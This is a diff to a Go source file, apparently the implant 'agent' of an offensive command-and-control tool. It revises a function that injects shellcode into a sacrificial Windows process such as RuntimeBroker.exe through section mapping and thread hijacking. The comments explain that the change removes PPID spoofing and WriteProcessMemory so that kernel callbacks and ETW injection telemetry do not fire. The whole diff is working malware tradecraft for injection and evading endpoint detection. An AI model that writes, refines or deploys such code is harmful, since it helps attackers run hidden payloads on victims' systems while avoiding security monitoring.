@@ -2,35 +2,28 @@
 
 package agent
 
-// forkRun — evasive shellcode execution in a sacrificial process.
+// forkRun — shellcode execution in a sacrificial process.
 //
-// What was detected (classic pattern):
-//   VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
-//
-// What this does instead:
-//   1. PPID spoofing — process appears as child of explorer.exe
-//   2. NtCreateSection + NtMapViewOfSection — no WPM, no VirtualAllocEx
-//   3. Thread hijacking (GetThreadContext/SetThreadContext) — no CreateRemoteThread
-//   4. Indirect NtProtectVirtualMemory — bypasses userland hook if present
+// Uses plain CreateProcess (no PPID spoof) + NtCreateSection/NtMapViewOfSection
+// (no VirtualAllocEx/WriteProcessMemory) + thread hijack.  PPID spoof triggers
+// PsSetCreateProcessNotifyRoutineEx; WPM triggers ETW cross-process injection
+// telemetry — both avoided here.
 
 import (
 	"fmt"
 	"os"
-	"strings"
 
 	"golang.org/x/sys/windows"
 )
 
-// forkRun spawns a sacrificial process and executes shellcode inside it.
-// Output is captured via anonymous pipe on stdout/stderr.
-// The sacrificial process is terminated after execution.
+// forkRun spawns a sacrificial process and executes shellcode inside it via
+// NtCreateSection + NtMapViewOfSection + thread hijack.  No output is captured.
 func forkRun(sc []byte, process string) (string, error) {
 	if process == "" {
 		sysroot := os.Getenv("SystemRoot")
 		if sysroot == "" {
 			sysroot = `C:\Windows`
 		}
-		// Use RuntimeBroker.exe or svchost.exe — both are common, long-lived
 		candidates := []string{
 			sysroot + `\System32\RuntimeBroker.exe`,
 			sysroot + `\System32\dllhost.exe`,
@@ -47,82 +40,37 @@ func forkRun(sc []byte, process string) (string, error) {
 		}
 	}
 
-	// ── Step 1: Capture pipe ──────────────────────────────────────────────────
-	var readPipe, writePipe windows.Handle
-	sa := windows.SecurityAttributes{InheritHandle: 1}
-	sa.Length = uint32(8 + 4 + 8) // sizeof(SECURITY_ATTRIBUTES)
-	if err := windows.CreatePipe(&readPipe, &writePipe, &sa, 0); err != nil {
-		return "", fmt.Errorf("CreatePipe: %w", err)
-	}
-	windows.SetHandleInformation(readPipe, windows.HANDLE_FLAG_INHERIT, 0)
-
-	// ── Step 2: Spawn suspended with PPID spoof ───────────────────────────────
-	pi, err := spawnSuspendedSpoofed(process)
-	windows.CloseHandle(writePipe) // close our copy
+	// ── Step 1: Spawn suspended (no PPID spoof) ───────────────────────────────
+	pi, err := spawnSuspendedPlain(process)
 	if err != nil {
-		windows.CloseHandle(readPipe)
 		return "", fmt.Errorf("spawn(%s): %w", process, err)
 	}
 
-	// ── Step 3: Section mapping — write shellcode into target ─────────────────
-	// NtCreateSection + NtMapViewOfSection: no WriteProcessMemory, no VirtualAllocEx
+	// ── Step 2: Map shellcode via NtCreateSection (no VirtualAllocEx / WPM) ────
 	remoteAddr, err := injectViaSection(pi.Process, sc)
 	if err != nil {
+		windows.CloseHandle(pi.Thread)
 		terminateSacrificial(pi)
-		windows.CloseHandle(readPipe)
 		return "", fmt.Errorf("section inject: %w", err)
 	}
 
-	// ── Step 4: Thread hijacking — redirect main thread to shellcode ──────────
-	// No CreateRemoteThread, no NtCreateThreadEx
+	// ── Step 3: Thread hijack — redirect main thread RIP to shellcode ─────────
 	if err := hijackThread(pi.Thread, remoteAddr); err != nil {
+		windows.CloseHandle(pi.Thread)
 		terminateSacrificial(pi)
-		windows.CloseHandle(readPipe)
 		return "", fmt.Errorf("thread hijack: %w", err)
 	}
 
-	// ── Step 5: Resume thread ─────────────────────────────────────────────────
+	// ── Step 4: Resume thread ─────────────────────────────────────────────────
 	if _, err := windows.ResumeThread(pi.Thread); err != nil {
+		windows.CloseHandle(pi.Thread)
 		terminateSacrificial(pi)
-		windows.CloseHandle(readPipe)
 		return "", fmt.Errorf("ResumeThread: %w", err)
 	}
 	windows.CloseHandle(pi.Thread)
+	windows.CloseHandle(pi.Process)
 
-	// ── Step 6: Collect output (max 60s) ─────────────────────────────────────
-	doneCh := make(chan string, 1)
-	go func() {
-		var sb strings.Builder
-		buf := make([]byte, 4096)
-		for {
-			var n uint32
-			e := windows.ReadFile(readPipe, buf, &n, nil)
-			if n > 0 {
-				sb.Write(buf[:n])
-			}
-			if e != nil {
-				break
-			}
-		}
-		doneCh <- sb.String()
-	}()
-
-	// Wait for process or timeout
-	procWaitForSingleObject.Call(uintptr(pi.Process), uintptr(60000))
-	windows.CloseHandle(readPipe)
-
-	var out string
-	select {
-	case out = <-doneCh:
-	default:
-		out = ""
-	}
-	terminateSacrificial(pi)
-
-	if out == "" {
-		out = fmt.Sprintf("[+] shellcode executed via section+hijack in %s", process)
-	}
-	return out, nil
+	return fmt.Sprintf("[+] fork_run: %d B shellcode executed in %s (PID %d)", len(sc), process, pi.ProcessId), nil
 }
 
 func terminateSacrificial(pi windows.ProcessInformation) {
